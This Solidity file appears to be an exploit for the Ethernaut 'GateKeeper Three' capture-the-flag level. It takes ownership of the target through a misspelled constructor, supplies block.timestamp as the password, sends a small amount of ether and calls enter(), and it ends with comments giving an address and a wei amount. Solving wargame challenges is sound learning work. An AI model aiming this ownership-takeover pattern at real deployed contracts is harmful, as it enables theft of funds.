// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperThree{
    function enter() external;
    function construct0r() external;
    function getAllowance(uint256 _password) external;
    function createTrick() external;
}


contract ExploitGateKeeperThree{
    IGateKeeperThree gateKeeperThree;

    constructor(address _addr){
        gateKeeperThree=IGateKeeperThree(_addr);

    }

    function Exploit()public payable{
        gateKeeperThree.construct0r();
        gateKeeperThree.createTrick();
        gateKeeperThree.getAllowance(block.timestamp);
        address(gateKeeperThree).call{value:1000000000000001}("");
        gateKeeperThree.enter();
    }
}//0x059cE4CDA7f5257D2035F4A11aCe8A9862057b48
//1100000000000000
